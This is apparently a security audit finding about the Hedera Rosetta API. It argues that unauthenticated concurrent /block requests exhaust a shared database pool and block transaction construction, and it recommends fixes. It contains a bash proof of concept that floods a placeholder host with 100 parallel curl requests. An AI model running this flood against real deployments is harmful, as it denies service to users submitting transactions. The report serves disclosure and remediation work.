### Title
Connection Pool Exhaustion via Unauthenticated Concurrent `/block` Requests Blocking Construction Service DB Access

### Summary
The Rosetta API exposes the `/block` endpoint to unauthenticated external users with no application-level concurrency or rate limiting. All services (block, construction, account, network) share a single `sql.DB` connection pool bounded by `Pool.MaxOpenConnections` (default 100). An attacker flooding 100+ concurrent `/block` requests targeting large blocks can saturate the pool for up to `StatementTimeout` (default 20 seconds) per connection, starving the construction service of DB connections needed for pre-gossip steps (`/construction/preprocess`, `/construction/metadata`, `/construction/payloads`).

### Finding Description

**Shared pool, no per-service isolation:**
`rosetta/main.go` line 200 creates a single `dbClient` and passes it to every repository:

```go
dbClient := db.ConnectToDb(rosettaConfig.Db)
``` [1](#0-0) 

`db.go` applies `MaxOpenConnections` to that single pool:

```go
sqlDb.SetMaxOpenConns(dbConfig.Pool.MaxOpenConnections)
``` [2](#0-1) 

Default `MaxOpenConnections = 100`, `StatementTimeout = 20` seconds: [3](#0-2) 

**Connection hold duration:**
`GetDbWithContext` wraps every query in a context with a `statementTimeout`-second deadline. A connection is held from query start until rows close or the context expires:

```go
childCtx, cancel := context.WithTimeout(ctx, time.Duration(d.statementTimeout)*time.Second)
return d.db.WithContext(childCtx), cancel
``` [4](#0-3) 

**`/block` makes multiple sequential DB queries per request:**
`blockAPIService.Block` calls `RetrieveBlock` (1 query), `FindBetween` (1 query, potentially large result set), and `updateOperationAccountAlias` (1 query per uncached operation): [5](#0-4) 

**Construction service shares the same pool:**
`constructionAPIService` holds `accountRepo` backed by the same `dbClient`. Pre-gossip endpoints (`/construction/preprocess`, `/construction/metadata`, `/construction/payloads`) call into `accountRepo` and `transactionHandler`, which acquire connections from the shared pool: [6](#0-5) 

**No application-level rate or concurrency limiting:**
The middleware stack in `main.go` is only `MetricsMiddleware → TracingMiddleware → CorsMiddleware`. No semaphore, no per-endpoint concurrency cap, no per-IP throttle: [7](#0-6) 

**Traefik middleware is disabled by default:**
The Helm chart defines `inFlightReq: amount: 5` per IP and `rateLimit: average: 10` per host, but `global.middleware` defaults to `false`, so the middleware chain is never applied in a default deployment: [8](#0-7) [9](#0-8) 

Even when enabled, `inFlightReq: amount: 5` per source IP is trivially bypassed with 20 distinct IPs (20 × 5 = 100 connections = full pool). The `rateLimit: average: 10` per host still allows 10 new requests/second; at 20-second hold times, 200 requests can be in flight simultaneously, exceeding the pool.

### Impact Explanation

When the pool is saturated, `sql.DB` queues new connection-acquisition attempts. These block until a connection is freed or the context deadline fires (up to 20 seconds). Any concurrent `/construction/metadata` or `/construction/preprocess` call that needs a DB connection will either block for the full `StatementTimeout` or return an error, preventing users from constructing and gossiping transactions to the Hedera network. This is a complete, sustained denial of the transaction-submission workflow for the duration of the attack.

### Likelihood Explanation

The attack requires zero authentication, zero special knowledge, and only a standard HTTP client. Sending 100 concurrent POST `/block` requests targeting a block with many transactions is trivially scripted. The attacker does not need to maintain a botnet; a single machine with 100 goroutines/threads suffices to exhaust the default pool. The attack is repeatable and cheap to sustain.

### Recommendation

1. **Separate DB pools per service class** — give the construction service its own `sql.DB` pool so block queries cannot starve it.
2. **Add an application-level concurrency semaphore** on the `/block` handler (e.g., a buffered channel of size N << `MaxOpenConnections`).
3. **Enable and harden the Traefik middleware by default** — set `global.middleware: true` in the default `values.yaml` and lower `inFlightReq.amount` to a value that, multiplied by the expected number of source IPs, stays well below `MaxOpenConnections`.
4. **Set `sql.DB.SetMaxIdleConns` and `SetConnMaxIdleTime`** to bound how long idle connections are retained, and consider setting a `WaitTimeout` via `db.SetConnMaxLifetime` to fail fast when the pool is exhausted rather than queuing indefinitely.

### Proof of Concept

```bash
# Identify a block index with many transactions (e.g., index 1000000)
# Send 100 concurrent /block requests to saturate the pool
for i in $(seq 1 100); do
  curl -s -X POST http://<rosetta-host>:5700/block \
    -H 'Content-Type: application/json' \
    -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},
         "block_identifier":{"index":1000000}}' &
done

# Simultaneously attempt a construction/metadata call (should block or error)
curl -X POST http://<rosetta-host>:5700/construction/metadata \
  -H 'Content-Type: application/json' \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},
       "options":{"operation_type":"CRYPTOTRANSFER"}}'
# Expected: request hangs for up to 20 seconds then returns a DB error,
# preventing transaction construction and gossip.
```

func (s *blockAPIService) Block(
	ctx context.Context,
	request *rTypes.BlockRequest,
) (*rTypes.BlockResponse, *rTypes.Error) {
	block, err := s.RetrieveBlock(ctx, request.BlockIdentifier)
	if err != nil {
		return nil, err
	}

	if block.Transactions, err = s.FindBetween(ctx, block.ConsensusStartNanos, block.ConsensusEndNanos); err != nil {
		return nil, err
	}

	var otherTransactions []*rTypes.TransactionIdentifier
	if len(block.Transactions) > s.maxTransactionsInBlock {
		otherTransactions = make([]*rTypes.TransactionIdentifier, 0, len(block.Transactions)-s.maxTransactionsInBlock)
		for _, transaction := range block.Transactions[s.maxTransactionsInBlock:] {
			otherTransactions = append(otherTransactions, &rTypes.TransactionIdentifier{Hash: transaction.Hash})
		}
		block.Transactions = block.Transactions[0:s.maxTransactionsInBlock]
	}

	if err = s.updateOperationAccountAlias(ctx, block.Transactions...); err != nil {
		return nil, err
	}

	return &rTypes.BlockResponse{Block: block.ToRosetta(), OtherTransactions: otherTransactions}, nil
```
